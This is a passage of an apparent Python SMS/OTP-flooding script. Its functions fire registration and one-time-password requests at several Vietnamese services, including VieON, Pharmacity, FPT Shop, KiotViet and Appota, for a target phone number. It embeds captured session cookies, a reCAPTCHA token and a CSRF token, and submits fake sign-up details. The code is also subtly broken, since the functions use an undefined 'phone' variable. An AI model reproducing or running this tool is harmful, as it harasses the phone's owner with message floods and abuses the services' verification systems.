        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
#
def vayvnd(sdt):
    cookies = {
        '_gcl_au': '1.1.1809435067.1696739941',
        '_tt_enable_cookie': '1',
        '_ttp': 'CIUoyacsdO8Ydz1SJu7glLAeUWO',
        '_fbp': 'fb.1.1696739941662.159133482',
        '_ym_uid': '1696739942336717250',
        '_ym_d': '1696739942',
        '_ga_P2783EHVX2': 'GS1.1.1696862851.2.0.1696862851.60.0.0',
        '_ga': 'GA1.2.793830112.1696739941',
        '_gid': 'GA1.2.592580676.1696862851',
        '_gat_UA-151110385-1': '1',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1809435067.1696739941; _tt_enable_cookie=1; _ttp=CIUoyacsdO8Ydz1SJu7glLAeUWO; _fbp=fb.1.1696739941662.159133482; _ym_uid=1696739942336717250; _ym_d=1696739942; _ga_P2783EHVX2=GS1.1.1696862851.2.0.1696862851.60.0.0; _ga=GA1.2.793830112.1696739941; _gid=GA1.2.592580676.1696862851; _gat_UA-151110385-1=1; _ym_isad=2; _ym_visorc=b',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'utm': [],
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
    }

    response = requests.post('https://api.vayvnd.vn/v2/users', cookies=cookies, headers=headers, json=json_data)   
#
def phar(sdt):
    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'referral': '',
        'g-recaptcha': '03AFcWeA6O1-lfSePnqUfgEjpdR_dA4mb4FXi8KyNSRJTwphO4F1iPsathMWRMOo3uzZecUzQ4AmTwCeybs1kTSi0FVCwMhXJuoMgSEH172hATOCsLCoyTYbhWPsnaBA112Il4kaoPMLYej9uA0MW8g03Xvl_B0qI2e5j1h4LSsqXzdxu3csep0zkU182O3WyQQmC0-yEvoMcBmXjNmONxEYf2B-KKw6wCCgf4IGX6ObQJtT7i_i97vc2AfIlGkf20jOQxDN5ZY0qED58fzcXydd1fsBmp24OZnoo_vuR0IWNZ1zhJ_boEj2pzXAI3TpbMKqxMjwnqyFcCf7ui5Zspe84nlQXn5IolmWNP0XE11hBpI0Iq1Xtq1D-9BqOV67I1WczTGS5khltl5r2CKKvCSvgOfpHfy3_WrIK1yH3oZ6NBPY6IqKVgAgFKuM-aaN8cawKijcvWsznqChaW5iWsHEsdU1JuURpKfKRDJgxzN2YEFN1IUY-90lpekEgQOR4k194Ef0K0ZQmxWgDSUKCOdXEOsNpzbZAWwMk8c7z5Uuk_kLrXk-znRDfad8K64iqfArSEaKzm7nc5ZcPRuy11lHHgEUwMRsC9oyilGgw6V2kcFtbnrAzWyVSgvMVZPy0k9kPSZZewqKjuCZdu5m8b69Bma7uN2IU1mX_sf2R6VWvpYkR981TsqWbiDgcL8Yhkk_CzztYoSTnxfBNUz08sVqPMjqYOf0dpxAwFwFfPJSNMVyKZ9Ud3amM-RPxXVBwSKo9qR4XpLrnAO2yCVpGu0PowyRpeVVW5_JaLqrakJZWo92qfbATg4gLcG9a8QyGT7cfF5rBeVdTGI8TSRRLeDIRKasXgbapnGBPeF2-fegHxlQFMgJ2yAfu80TPvsyV1SlXxg76ReKz6FSXsProP29iF75X30NqXWE-C4WTowyxI3ZG9PrrVhfndGJZ9aFiR392aEHeDSqpv_CzXB_af5vbSW3aHGJHHkmSXGcyr93EccJZBThMJHUsLTBy-SoTW671SrVd5N0TTo9BkkHy7SEdwF6BBsbuxLUE5_pJM8uAMkFLxf4M7kcbRbtPaPZOzB_ZYwQtiTzUSVPmRKz_8MwJZY1eCeyMsIPjSqy5Hq8bduKFQn_Oxut0W98-HiltuDV9vdNNTPJp93F8--RT05LUAuag1Kr3BjvLlz6Grf3Ejm8kvixwMXeE_W2DglOtCxuELrcTek1S-3qQ8QaaNvmultuAmcoDpgeYCRZBIaxMUiwt1eLYtkEGtOOakcne8HxSmHhioSBnip5QJzeCQNOkpK2yOQt16LIJBWDNwysxeX7iHDfj0qordwRiIHm_7TKlNCZHCso4AEaU88k6DdBxJnWPQSfZVxoZsoJjqcLqZXlcO-x6ZryQsowV_k7zIOYGcd9bAHIXQdDV3sB1LFXniTfjPhENt63PH9u1KJudq-M2fijBgX9sgmCb7KeC6xgu-qWgqTLf0LGidtpSSRjw_613h0rFc5mtiY-SiegxNkto4FbguMhrXGWQg96dpvxxrSly_KvMy9aOaIrgkdTjeSFSYdCM6p_wM5JZ3wwhmYNQt2rmmFo9WrYlV7bEcvBanXTGofO2gvI75lZ8ddErTyFbtcokBlA',
    }

    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data) 
#
def one(sdt):
    cookies = {
        'OnCredit_id': '6522331fd58fb4.04333985',
        '_fbp': 'fb.1.1696740132446.964222131',
        'GN_USER_ID_KEY': '96c89958-bc71-4135-9164-6047abbdba17',
        '_hjSessionUser_1876820': 'eyJpZCI6ImJlZjlkZTMwLWQwMTctNTdiMC1hZTIxLTc4Yzg3ZDZkY2RhNiIsImNyZWF0ZWQiOjE2OTY3NDAxMzIzODIsImV4aXN0aW5nIjp0cnVlfQ==',
        'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': 'id29hUgI9mZItrIe7tE9MuhcYbjWXzRNUzHCVgYXqlA=',
        'SN5c8116d5e6183': 'qtr8nlgs3pvh853hbn2mpp8h86',
        '_gid': 'GA1.2.1746242977.1696860655',
        '_hjSessionUser_2975850': 'eyJpZCI6IjZmNGM2OWI0LWZkZTEtNTYwMy1hYzY0LWMyZDI0YzczMjhjOSIsImNyZWF0ZWQiOjE2OTY4NjA2NTQ2NjYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_gat_UA-139625802-1': '1',
        '_hjIncludedInSessionSample_1876820': '0',
        '_hjSession_1876820': 'eyJpZCI6IjJjNDIyYjMyLWFhYjQtNDNjMC1hYzVjLTk2NTUxMzkwNjFjMCIsImNyZWF0ZWQiOjE2OTY4NjMwNjg2MzIsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_hjAbsoluteSessionInProgress': '1',
        'GN_SESSION_ID_KEY': 'dd549683-ddb8-46c0-bfdc-9cf08bc25bc2',
        '_ga': 'GA1.1.1420842238.1696740132',
        '_ga_462Z3ZX24C': 'GS1.1.1696863068.4.1.1696863073.55.0.0',
    }

    headers = {
        'authority': 'oncredit.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'OnCredit_id=6522331fd58fb4.04333985; _fbp=fb.1.1696740132446.964222131; GN_USER_ID_KEY=96c89958-bc71-4135-9164-6047abbdba17; _hjSessionUser_1876820=eyJpZCI6ImJlZjlkZTMwLWQwMTctNTdiMC1hZTIxLTc4Yzg3ZDZkY2RhNiIsImNyZWF0ZWQiOjE2OTY3NDAxMzIzODIsImV4aXN0aW5nIjp0cnVlfQ==; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=id29hUgI9mZItrIe7tE9MuhcYbjWXzRNUzHCVgYXqlA=; SN5c8116d5e6183=qtr8nlgs3pvh853hbn2mpp8h86; _gid=GA1.2.1746242977.1696860655; _hjSessionUser_2975850=eyJpZCI6IjZmNGM2OWI0LWZkZTEtNTYwMy1hYzY0LWMyZDI0YzczMjhjOSIsImNyZWF0ZWQiOjE2OTY4NjA2NTQ2NjYsImV4aXN0aW5nIjp0cnVlfQ==; _gat_UA-139625802-1=1; _hjIncludedInSessionSample_1876820=0; _hjSession_1876820=eyJpZCI6IjJjNDIyYjMyLWFhYjQtNDNjMC1hYzVjLTk2NTUxMzkwNjFjMCIsImNyZWF0ZWQiOjE2OTY4NjMwNjg2MzIsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=1; GN_SESSION_ID_KEY=dd549683-ddb8-46c0-bfdc-9cf08bc25bc2; _ga=GA1.1.1420842238.1696740132; _ga_462Z3ZX24C=GS1.1.1696863068.4.1.1696863073.55.0.0',
        'origin': 'https://oncredit.vn',
        'referer': 'https://oncredit.vn/registration',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'data[typeData]': 'sendFunnel',
        'data[step]': 'step0',
        'data[data][name]': '',
        'data[data][telephone]': phone,
        'data[data][email]': '',
        'CSRFName': 'CSRFGuard_ajax',
        'CSRFToken': 'D3NQbafSR5Q2bDDrZbYisErBQEAe8ifsBksfAyan3TSy2aGQ2i7Bhz8i3rGaaRYA',
    }

    response = requests.post('https://oncredit.vn/?ajax', cookies=cookies, headers=headers, data=data)
#
def fptshop(sdt):
    cookies = {
        '_gid': 'GA1.3.1541223750.1696863191',
        '_gat': '1',
        '_gcl_au': '1.1.1584248520.1696863191',
        '_ga': 'GA1.1.2116445144.1696863191',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228uHHQLF5lZCi1qTk9h8J%22%7D',
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '5ed1bba7-e921-4ad8-b843-61ea3420e241',
        'fpt_uuid': '%223cf7fba4-7700-46f5-bdea-ba209b50741d%22',
        'ajs_group_id': 'null',
        '_fbp': 'fb.2.1696863192654.1366932249',
        'vMobile': '2',
        '__admUTMtime': '1696863193',
        'cf_clearance': 'bsGSuKBRrkf1kGeMX0nKBdXtqx69fJ6AgBQX1swpJy8-1696863193-0-1-1887654.19f0becf.568929b4-0.2.1696863193',
        '_tt_enable_cookie': '1',
        '_ttp': '3DAP_8ozJu_gH2HMjQKwLPP0ShR',
        '_hjSessionUser_731679': 'eyJpZCI6ImIwNmY4ZGNjLTY5NzctNTkxYS1hYTM5LTE1Mzk1NTBhNmQ4MiIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNDUsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImY3M2FkODIzLTg4NmUtNDgzZi1hNzJkLThjNGExMDkzMzU2MyIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNTAsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_hjAbsoluteSessionInProgress': '0',
        'dtdz': '360b50d3-59a3-4318-bee1-cbab53ae7577',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '9',
        '__R': '1',
        '__uif': '__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163',
        '_ga_ZR815NQ85K': 'GS1.1.1696863191.1.1.1696863213.38.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_gid=GA1.3.1541223750.1696863191; _gat=1; _gcl_au=1.1.1584248520.1696863191; _ga=GA1.1.2116445144.1696863191; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228uHHQLF5lZCi1qTk9h8J%22%7D; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=5ed1bba7-e921-4ad8-b843-61ea3420e241; fpt_uuid=%223cf7fba4-7700-46f5-bdea-ba209b50741d%22; ajs_group_id=null; _fbp=fb.2.1696863192654.1366932249; vMobile=2; __admUTMtime=1696863193; cf_clearance=bsGSuKBRrkf1kGeMX0nKBdXtqx69fJ6AgBQX1swpJy8-1696863193-0-1-1887654.19f0becf.568929b4-0.2.1696863193; _tt_enable_cookie=1; _ttp=3DAP_8ozJu_gH2HMjQKwLPP0ShR; _hjSessionUser_731679=eyJpZCI6ImIwNmY4ZGNjLTY5NzctNTkxYS1hYTM5LTE1Mzk1NTBhNmQ4MiIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNDUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImY3M2FkODIzLTg4NmUtNDgzZi1hNzJkLThjNGExMDkzMzU2MyIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNTAsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; dtdz=360b50d3-59a3-4318-bee1-cbab53ae7577; __iid=; __iid=; __su=0; __su=0; __RC=9; __R=1; __uif=__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163; _ga_ZR815NQ85K=GS1.1.1696863191.1.1.1696863213.38.0.0',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
#
def kiotviet(sdt):
  def random_string(length):
      import random
      characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
      result = ""
      for _ in range(length):
          result += random.choice(characters)
      return result
  alo=random_string(8)
  ten=random_string(4)
  phone = '0' + phone
  phone = phone.replace('00','')
  phone12 = '+84' + phone

  cookies = {
      'ads': 'www.google.com',
      'refcode': '746',
      'time_referer': '1689061704',
      'kvas-uuid': '3a85af4a-1908-48f2-980d-d15395992de5',
      'kvas-uuid-d': '1686469706132',
      'gkvas-uuid': 'fc23dc65-4af3-4711-8198-90a46e6b0ca1',
      'gkvas-uuid-d': '1686469706134',
      'kv-session': '94e736d4-493e-4656-9a6a-266817374182',
      '_hjFirstSeen': '1',
      '_hjIncludedInSessionSample_563959': '1',
      '_hjSession_563959': 'eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==',
      '_gid': 'GA1.2.1638977009.1686469708',
      '_tt_enable_cookie': '1',
      '_ttp': 'KrXyjN8UQfZPEg6udl4pOmk7Tnd',
      '_gac_UA-158809353-1': '1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
      '_gac_UA-64814867-1': '1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE',
      'source_referer': '%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D',
      'kv-session-d': '1686469712238',
      '_hjSessionUser_563959': 'eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==',
      'parent': '77',
      '_ga': 'GA1.2.1398574114.1686469708',
      '_ga_6HE3N545ZW': 'GS1.1.1686469708.1.1.1686469715.53.0.0',
      '_fw_crm_v': '4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
  }

  headers = {
      'authority': 'www.kiotviet.vn',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'cookie': 'ads=www.google.com; refcode=746; time_referer=1689061704; kvas-uuid=3a85af4a-1908-48f2-980d-d15395992de5; kvas-uuid-d=1686469706132; gkvas-uuid=fc23dc65-4af3-4711-8198-90a46e6b0ca1; gkvas-uuid-d=1686469706134; kv-session=94e736d4-493e-4656-9a6a-266817374182; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6ImEzM2Y4MWFmLWI2YWQtNDE4Ny04N2QxLWUwM2QyZTFmNDAyMiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NzcsImluU2FtcGxlIjp0cnVlfQ==; _gid=GA1.2.1638977009.1686469708; _tt_enable_cookie=1; _ttp=KrXyjN8UQfZPEg6udl4pOmk7Tnd; _gac_UA-158809353-1=1.1686469710.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; _gac_UA-64814867-1=1.1686469711.CjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE; source_referer=%5B%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%2C%22%2C%22http-referral%7Cwww.google.com%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%2C%22refcode%7C746%7C2023-06-11%7Ccrmutm%3D%3Frefcode%3D746%26utm_source%3DGoogle%26utm_medium%3DKiotViet-Key%26utm_campaign%3DGoogle-Search%26utm_content%3DMien-phi-dung-thu%26gclid%3DCjwKCAjw4ZWkBhA4EiwAVJXwqaHz-822msy4qSq-UPOV3wfOsFZOOcHp2C8PHW1CIpeG35Ao3-Qx6xoCD0AQAvD_BwE%2C%22%5D; kv-session-d=1686469712238; _hjSessionUser_563959=eyJpZCI6IjMwYjA2OGI0LTU4MzAtNTdkOS1iZjAwLWU0NjIxNzQ1MWZkYiIsImNyZWF0ZWQiOjE2ODY0Njk3MDc2NTcsImV4aXN0aW5nIjp0cnVlfQ==; parent=77; _ga=GA1.2.1398574114.1686469708; _ga_6HE3N545ZW=GS1.1.1686469708.1.1.1686469715.53.0.0; _fw_crm_v=4721c26b-683b-4e2b-dbb2-62e4d7a8e93d',
      'dnt': '1',
      'origin': 'https://www.kiotviet.vn',
      'referer': 'https://www.kiotviet.vn/dang-ky/?refcode=746',
      'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
  }

  data = {
      'phone': phone12,
      'code': alo,
      'name': 'lê van sang',
      'email': '',
      'zone': 'An Giang - Huyện Châu Phú',
      'merchant': 'muabansi',
      'username': phone,
      'industry': 'Thời trang',
      'ref_code': '746',
      'industry_id': '77',
      'phone_input': phone,
  }

  response = requests.post(
      'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
      cookies=cookies,
      headers=headers,
      data=data,
  )
#
def appota(sdt):
    cookies = {
        '_ga': 'GA1.2.97678528.1696740286',
        '_fbp': 'fb.1.1696740286649.405956396',
        '_gid': 'GA1.2.1991886255.1696863503',
        '_gat': '1',
        '_ga_8W5EGNGFDP': 'GS1.2.1696863503.2.0.1696863503.0.0.0',
        'pay_session': 'eyJpdiI6Im9FYndETlF6TzRKNUNqMU1KOFlzNXc9PSIsInZhbHVlIjoiOUh3Z1VRb3RXOHlLVFZ5YlU0VHBTdk5tQ1o2NHQxemlrTHRHYVFzbHFrejdHK3Ftd0tSdTlzZ0VUcFlxeFlOYzEwa0x3R0FDWElUNjNncnVQRU9ncnc9PSIsIm1hYyI6IjM5NzY4OTQ5NGJlZWUwOGE5YTViNjM2NDAxZTg3OTZkMGM5ZWI0OWRkYjExNzY1NTk4NWFmY2RmOTA0Y2UzYTAifQ%3D%3D',
    }

    headers = {
        'authority': 'vi.appota.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.2.97678528.1696740286; _fbp=fb.1.1696740286649.405956396; _gid=GA1.2.1991886255.1696863503; _gat=1; _ga_8W5EGNGFDP=GS1.2.1696863503.2.0.1696863503.0.0.0; pay_session=eyJpdiI6Im9FYndETlF6TzRKNUNqMU1KOFlzNXc9PSIsInZhbHVlIjoiOUh3Z1VRb3RXOHlLVFZ5YlU0VHBTdk5tQ1o2NHQxemlrTHRHYVFzbHFrejdHK3Ftd0tSdTlzZ0VUcFlxeFlOYzEwa0x3R0FDWElUNjNncnVQRU9ncnc9PSIsIm1hYyI6IjM5NzY4OTQ5NGJlZWUwOGE5YTViNjM2NDAxZTg3OTZkMGM5ZWI0OWRkYjExNzY1NTk4NWFmY2RmOTA0Y2UzYTAifQ%3D%3D',
        'origin': 'https://vi.appota.com',
        'referer': 'https://vi.appota.com/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_number': phone,
    }

    response = requests.post('https://vi.appota.com/check-phone-register.html', cookies=cookies, headers=headers, data=data)    
#
def meta(sdt):
    cookies = {
        '_ssid': 'yk50hzpzzjqhzzy5duddvmo0',
        '_cart_': 'abf8f6dd-ffa8-4fdb-997f-4646887a324b',
        '_gcl_au': '1.1.435316700.1696863636',
        '__ckmid': '797588eadd004de6b9763943ccf35862',
        '_gid': 'GA1.2.545790176.1696863636',
        '_gat_UA-1035222-8': '1',
        '_ga': 'GA1.1.1129220879.1696863636',
        '_ga_L0FCVV58XQ': 'GS1.1.1696863636.1.1.1696863641.55.0.0',
        '_ga_YE9QV6GZ0S': 'GS1.1.1696863639.1.1.1696863649.0.0.0',
    }

    headers = {
        'authority': 'meta.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json',
        # 'cookie': '_ssid=yk50hzpzzjqhzzy5duddvmo0; _cart_=abf8f6dd-ffa8-4fdb-997f-4646887a324b; _gcl_au=1.1.435316700.1696863636; __ckmid=797588eadd004de6b9763943ccf35862; _gid=GA1.2.545790176.1696863636; _gat_UA-1035222-8=1; _ga=GA1.1.1129220879.1696863636; _ga_L0FCVV58XQ=GS1.1.1696863636.1.1.1696863641.55.0.0; _ga_YE9QV6GZ0S=GS1.1.1696863639.1.1.1696863649.0.0.0',
        'origin': 'https://meta.vn',
        'referer': 'https://meta.vn/account/register?ReturnUrl=/account/register',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': phone,
            'act': 'send',
            'type': 'phone',
        },
        'api_method': 'CheckExist',
    }

    response = requests.post(
        'https://meta.vn/app_scripts/pages/AccountReact.aspx',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
#
def blu(sdt):
    cookies = {
        'DMX_View': 'DESKTOP',
        'DMX_Personal': '%7b%22UID%22%3a%222e85670b4f888d4c99dbd2360bc90ce380ef3be6%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
        '_gcl_au': '1.1.253766059.1695302529',
        '_fbp': 'fb.1.1695302529320.2091173293',
        '_pk_id.8.8977': 'b761a85b1c4ec708.1695302530.',
        'lhc_per': 'vid|c5415ae10a5aa92849c8',
        '_utm_thegioididong': 'ad8ce83b-f263-4830-b439-e21772306183',
        '_gid': 'GA1.2.1954391721.1696863755',
        '_gat_UA-38936689-1': '1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1696863755%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_ses.8.8977': '1',
        'cebs': '1',
        '_ce.s': 'v~b5f384abc977844302b06e0fe60fd00f4f1fe0c4~lcw~1696767519844~vpv~3~v11.fhb~1696740465158~v11.lhb~1696740465159~gtrk.la~lnhfkler~lcw~1696863759182',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8ImUV2tmepFDqJx13sccnB46MPBobaACSBj7eshF_9SCebN3S7stxk2YXcBeLtItXkhdRYJoesT9IqKJ2ZQjWPChRnERC7-a87atovBdMTC1VozbOncUllBu79jlyN9dNLiYqAUGwlUEo4sZZeqUmq0',
        '_ga_Y7SWKJEHCE': 'GS1.1.1696863755.4.1.1696863759.56.0.0',
        '_ga': 'GA1.1.1835783839.1695302529',
